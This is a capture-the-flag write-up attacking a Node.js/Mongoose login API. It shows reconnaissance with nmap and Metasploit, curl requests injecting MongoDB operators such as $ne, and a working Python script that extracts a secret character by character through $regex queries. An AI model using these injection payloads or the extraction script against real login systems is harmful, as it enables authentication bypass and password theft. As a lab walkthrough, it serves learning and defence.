We are given the IP and a port:

* `206.189.121.131:31978`

And web application source code dump.

# Recon

Let's find what we can with `nmap`:

```
$ sudo nmap -A -p 31978 206.189.121.131

Ok, Node.js application, nothing more. Let's explore the downloadable.

## Website

![](img/00002.png)

### /index.js
```js
const express    = require('express');
const app        = express();
const bodyParser = require('body-parser');
const routes     = require('./routes');
const mongoose   = require('mongoose');

mongoose.connect('mongodb://localhost:27017/heros', { useNewUrlParser: true , useUnifiedTopology: true });

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ 
	extended: true 
}));

app.use(express.static('static'));
app.set('view engine', 'pug');

app.use(routes);

app.all('*', (req, res) => {
    return res.status(404).send({
        message: '404 page not found'
    });
});

app.listen(80, () => console.log('Listening on port 1337'));     
```

Right away we can see the MongoDB database reference with `mongoose` library.

### /routes/index.js
```js
const express = require('express');
const router  = express.Router();
const User    = require('../models/User');

router.get('/', (req, res) => {
	return res.render('index');
});

router.post('/api/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return User.find({ 
			username,
			password
		})
			.then((user) => {
				if (user.length == 1) {
					return res.json({logged: 1, message: `Login Successful, welcome back ${user[0].username}.` });
				} else {
					return res.json({logged: 0, message: 'Login Failed'});
				}
			})
			.catch(() => res.json({ message: 'Something went wrong'}));
	}
	return res.json({ message: 'Invalid username or password'});
});

module.exports = router;      
```

It will be hard to do some NoSQL injection, because database is not queried directly - but with some `mongoose` models. For now let's remember that application uses `Schema.find` method to search in a user collection, giving `username` and `password` properties that are received in the POST request body. Also, worth remembering that API returns `{logged: int, message: string}` JSON.

### /models/User.js
```js
const mongoose = require('mongoose');
const Schema   = mongoose.Schema;

let User = new Schema({
	username: {
		type: String
	},
	password: {
		type: String
	}
}, {
	collection: 'users'
});

module.exports = mongoose.model('User', User);    
```

Boilerplate `User` model from `users` collection registration.

### /static/js/main.js
```js
const login    = document.getElementById('login');
const response = document.getElementById('response');

login.addEventListener('submit', e => {

	e.preventDefault();

	fetch('/api/login', {
		method: 'POST',
		body: new URLSearchParams(new FormData(e.target))
	})
        .then(resp => resp.json())
        .then(data => {
            if (data.logged) {
                login.remove();
                response.innerHTML = data.message;
            } else {
                response.innerHTML = data.message;
            }
	});
});    
```

Nothing interesting, because whatever is done to the request parameters that are read from the HTML element - we are going to bypass it querying the API directly.

That's just a Pug rendering engine. We are ready for the API enumeration to get the _Logged in_ response, get the session ID and use it in the browser to see what we can do from then.

## Enumeration

I'm assuming that `mongoose` library have some vulnerabilities over `Schema.find` method. We clearly cannot do some sneaky injections like `' || 1==1` so let's find out what we have here.

First things first, `nmap` that database port to see if by any change it is exposed to the network.

```
$ sudo nmap -A -p 27017 206.189.121.131

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 18:42 CEST

```

Well, it is filtered, so I guess it is behind a firewall, but I'm taking my chances with Metasploit:

```
msf6 auxiliary(scanner/mongodb/mongodb_login) > run

[*] 206.189.121.131:27017 - Scanning IP: 206.189.121.131

[*] 206.189.121.131:27017 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Yeah, no success. Also, with `mongo` client

```
$ ./mongo 206.189.121.131

MongoDB shell version v4.4.5
connecting to: mongodb://206.189.121.131:27017/test?compressors=disabled&gssapiServiceName=mongodb

connect@src/mongo/shell/mongo.js:374:17
@(connect):2:6
exception: connect failed
exiting with code 1
```

So going back to the `mongoose` and API we've got here. When searching for vulnerables in `Schema.find` I've come across some interesting readings (check _Additional readings_ section) that telling this, specifically:

```
To perform a successful MongoDB injection, it is enough if the attacker supplies the following malicious input data as a POST request:

username[$eq]=admin&password[$ne]=1

The [$ne] query operator means not equal. Therefore, the resulting query will find the first record in which the username is admin and the password is not 1. If this code is used for authentication, the attacker is logged in as the admin user.
```


But I don't know the username, so I should aim for the following request: `username[$eq]=admin&password[$ne]=`. I did a test login on the web browser to see in what form POST request is made. `application/x-www-form-urlencoded` it is.

### NoSQL Injection - `$ne` operator

I've tried many variations:

```
curl -H "application/x-www-form-urlencoded" -d "username=admin&password=admin" -v 206.189.121.131:31978/api/login
curl -H "application/x-www-form-urlencoded" -d "username={'$gt': ''}&password={'$gt': ''}" -v 206.189.121.131:31978/api/login

curl -H "application/x-www-form-urlencoded" -d "username={'$gt': ''}&password={'$gt': ''}" -v 206.189.121.131:31978/api/login

	{"logged":0,"message":"Login Failed"} 

curl -H "application/json" -d "{'username': {'$gt': ''},'password': {'$gt': ''}}" -v 206.189.121.131:31978/api/login
curl -H "application/json" -d "{'username': {'$ne': null}, 'password': {'$ne': null} }" -v 206.189.121.131:31978/api/login

curl -H "Content-Type: text/plain" -d "username[$ne]=&password[$ne]=" -v 206.189.121.131:31978/api/login

	{"message":"Invalid username or password"}   
```

I've come up with the idea to see how really the request looks - I must send the wrong data. Capturing the traffic with `wireshark` indeed shows, that requests I am sending via `curl` are truncated from `$ne`-like parameters. So I'm encoding the whole POST data in [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=dXNlcm5hbWVbJG5lXT0mcGFzc3dvcmRbJG5lXT0) and voila:

```
username[$ne]=&password[$ne]=
==
username%5B%24ne%5D%3D&password%5B%24ne%5D%3D
```

```
$ curl -d "username%5B%24ne%5D%3D&password%5B%24ne%5D%3D" -v 206.189.121.131:31978/api/login

```

Now I need to get a grab on the session cookie.. But there is none. At least I have a username: admin.

I've scratched my head and started digging again. And I've found something.

### NoSQL Injection - regex requests

Do you remember these movies when some hacker is cracking somebody's password - character by character?

If you thought this is only a movie trick to keep the viewers interested.. we're both mistaken. Apparently this is really a thing, and we are going to do this right now.

Regex queries/enumeration. Similar to the previous trick, but a bit smarter - instead of matching whatever password user can have - we are going to _reverse guess_ the password character by character.

```
user=admin&password[$regex]=.*
```

By making multiple requests we can match further and further by verifyng the response API is giving (remember `logged` property?). By assuming that the password is a flag we can make a successful login attempt with

```
user=admin&password[$regex]=CHTB.*
```

So let's write a script.

# Exploit

I'm borrowing the baseline script from [0daylabs](https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100). After some modifications:

```python
# mongoregexdiscovery.py

import requests
import string
import json 

flag = "CHTB{"
url = "http://206.189.121.131:31978/api/login"

restart = True

while restart:
    restart = False

    # Characters like *, ., &, and + have to be avoided because we use regex
    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag + i
        post_data = {'username': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data, allow_redirects=False)

        rData = json.loads(r.content)
        if rData["logged"] == 1:
        	#we succesfully logged in
            print(payload)
            restart = True
            flag = payload

            # Exit if "}" gives a valid status

            if i == "}":
                print("\nFlag: " + flag)
                exit(0)
            break
```

Fire and forget. Sit back and feel like a movie hacker :)
